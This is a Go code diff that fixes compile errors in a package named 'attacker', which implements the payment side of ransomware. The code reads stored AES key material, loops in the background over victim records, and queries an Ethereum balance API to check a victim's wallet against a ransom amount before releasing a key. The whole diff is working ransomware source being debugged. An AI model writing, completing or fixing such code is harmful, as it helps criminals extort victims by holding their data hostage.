@@ -1,6 +1,7 @@
 package attacker
 
 import (
+    "io"
     "os"
     "time"
     "bufio"
@@ -74,7 +75,7 @@ func (s *Scheme) VerifyPayment(pubkey string) []byte {
     }
     defer clr.Close()
     aesIVKey := make([]byte, 32)
-    err = io.ReadFull(clr, aesIVKey)
+    _, err = io.ReadFull(clr, aesIVKey)
     if err != nil {
         return nil
     }
@@ -83,11 +84,14 @@ func (s *Scheme) VerifyPayment(pubkey string) []byte {
 
 func (s *Scheme) VerifyPaymentsBackground() {
     for {
-        dir, err := os.Open(s.path)
+        var err error
+        var dir *os.File
+        var ents []os.FileInfo
+        dir, err = os.Open(s.path)
         if err != nil {
             goto next_cycle
         }
-        ents, err := dir.Readdir(-1)
+        ents, err = dir.Readdir(-1)
         if err != nil {
             dir.Close()
             goto next_cycle
@@ -120,25 +124,25 @@ func (s *Scheme) localVerifyPayment(pubkey string) bool {
     if err != nil {
         return false
     }
-    balance, err := s.checkBalance(string(wallet))
-    if err != nil {
+    balance, ok := s.checkBalance(string(wallet))
+    if !ok {
         return false
     }
     return balance < ransomValue
 }
 
-func (s *Scheme) checkBalance(wallet string) (float64, error) {
+func (s *Scheme) checkBalance(wallet string) (float64, bool) {
     rsp, err := s.client.Get("https://api.ethplorer.io/getAddressInfo/" + wallet + "?apiKey=freekey")
     if err != nil {
-        return err
+        return 0.0, false
     }
     defer rsp.Body.Close()
     var e ethexplorer
     err = json.NewDecoder(bufio.NewReader(rsp.Body)).Decode(&e)
     if err != nil {
-        return err
+        return 0.0, false
     }
-    return e.ETH.Balance
+    return e.ETH.Balance, true
 }
 
 func (s *Scheme) GenerateAndStoreKeys() (*Keys, error) {
